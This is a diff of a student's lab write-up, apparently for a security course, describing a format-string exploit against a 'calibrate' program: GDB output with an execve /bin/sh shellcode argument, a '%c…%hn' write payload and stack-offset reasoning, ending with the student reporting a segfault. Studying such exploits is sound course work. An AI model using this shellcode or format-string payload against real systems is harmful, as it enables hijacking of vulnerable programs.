@@ -459,7 +459,40 @@ First, I wrote the address of RIP which I found from GDB into the first two blan
 0x00000000 [  ][  ][  ][  ] SFP of printf
 [printf frame]
 ```
-Without needing to fill out the addresses into the diagram, I understood how far to move up `printf`'s "pointer". Since I wanted `printf` to gain access to the beginning of `buf`, I had to shift the argument "pointer" up `4` times. That became the answer to the second blank, where `%c` would be inputted `4` times.
+Without needing to fill out the addresses into the diagram, I understood how far to move up `printf`'s "pointer". Since I wanted `printf` to gain access to the beginning of `buf`, I had to shift the argument "pointer" up to `arg5`. I opened GDB and began looking for addresses:
+```
+(gdb) b 10
+Breakpoint 1 at 0x8049224: file calibrate.c, line 10.
+(gdb) r
+Starting program: /home/antares/calibrate $'j2X̀\211É\301jGX̀1\300Ph-iii\211\342Ph+mmm\211\341Ph//shh/bin\211\343PRQS\211\3411Ұ\v̀' < /tmp/tmp.efmljD
+Input calibration parameters:
+Calibration parameters received:
+
+Breakpoint 1, calibrate (buf=0xffffd660 "AAAA0xd64cAAAA0xffff%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%55400u%hn%10135u%hn\n") at calibrate.c:10
+10	    printf(buf);
+(gdb) s
+printf (fmt=0xffffd660 "AAAA0xd64cAAAA0xffff%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%55400u%hn%10135u%hn\n") at src/stdio/printf.c:8
+8	src/stdio/printf.c: No such file or directory.
+(gdb) i f
+Stack level 0, frame at 0xffffd620:
+ eip = 0x8049abe in printf (src/stdio/printf.c:8); saved eip = 0x804922f
+ called by frame at 0xffffd650
+ source language c.
+ Arglist at 0xffffd618, args: fmt=0xffffd660 "AAAA0xd64cAAAA0xffff%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%55400u%hn%10135u%hn\n"
+ Locals at 0xffffd618, Previous frame's sp is 0xffffd620
+ Saved registers:
+  eip at 0xffffd61c
+(gdb) x/32x 0xffffd61c
+0xffffd61c:	0x0804922f	0xffffd660	0x00000080	0x08050020
+0xffffd62c:	0x080493c5	0x00000000	0x00000000	0x00000001
+0xffffd63c:	0x00000000	0x00000002	0x00000000	0xffffd6e8
+0xffffd64c:	0x0804928f	0xffffd660	0x08048034	0x00000020
+0xffffd65c:	0x00000008	0x41414141	0x36647830	0x41416334
+0xffffd66c:	0x78304141	0x66666666	0x63256325	0x63256325
+0xffffd67c:	0x63256325	0x63256325	0x63256325	0x63256325
+0xffffd68c:	0x63256325	0x63256325	0x34353525	0x25753030
+```
+I placed a breakpoint directly at the `printf` function and stepped into it so I could look for the RIP of `printf`. After running `info frame` and finding the RIP, I hex dumped starting from the RIP down for 32 sets of 4 bytes. I looked for the `AAAA` garbage as an indicator for the beginning of `arg5` and found it at `0xffffd660` as it clearly read `0x41414141`. I counted the number of sets of 4 bytes to shift up to just before the garbage `41`s, which came out to be 16, which became my `%c` multiplier value.
 
 Finally, in the last section of the `egg`, I had to write in the address to the `SHELLCODE` since the `printf` function will write into the address pointed to by the argument "pointer". I found the `SHELLCODE` location by placing a breakpoint in `main` and then printing out argv elements until I recognized the bytes of `SHELLCODE` and then checking with the literal hexadecimal in the `arg` file:
 ```
@@ -479,4 +512,4 @@ $3 = 0xffffd888 "j2X̀\211É\301jGX̀1\300Ph-iii\211\342Ph+mmm\211\341Ph//shh/bi
 (gdb) x/4x argv[1]
 0xffffd888:	0xcd58326a	0x89c38980	0x58476ac1	0xc03180cd
 ```
-After figuring out the address of the `SHELLCODE`, I inputted it into the `egg` file, following the `FIRST_HALF` and `SECOND_HALF` variables' comment hints. Finally, I calculated the number of remaining bytes—which I'm probably wrong, awaiting private Ed post reply...
+After figuring out the address of the `SHELLCODE`, I inputted it into the `egg` file, following the `FIRST_HALF` and `SECOND_HALF` variables' comment hints. Finally, I calculated the number of remaining bytes from the two sets of `'AAAA'`s to the extra `%c` padding. Unfortunately, I could not get past the segmentation fault and ran out of time. Partial credit for being so close to the solution would be greatly appreciated.
